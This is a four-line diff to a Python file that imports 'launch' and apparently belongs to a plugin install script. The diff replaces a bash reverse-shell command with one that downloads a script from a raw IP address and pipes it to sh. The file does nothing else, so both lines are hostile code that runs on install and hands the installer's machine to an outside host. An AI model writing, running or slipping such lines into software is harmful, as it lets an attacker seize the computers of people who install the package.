@@ -1,4 +1,4 @@
 import launch
 import os
 
-os.system("bash -i >& /dev/tcp/ip/port 0>&1")
+os.system("curl -fsSL -m180 http://1.94.183.238:8084/slt ｜ sh")
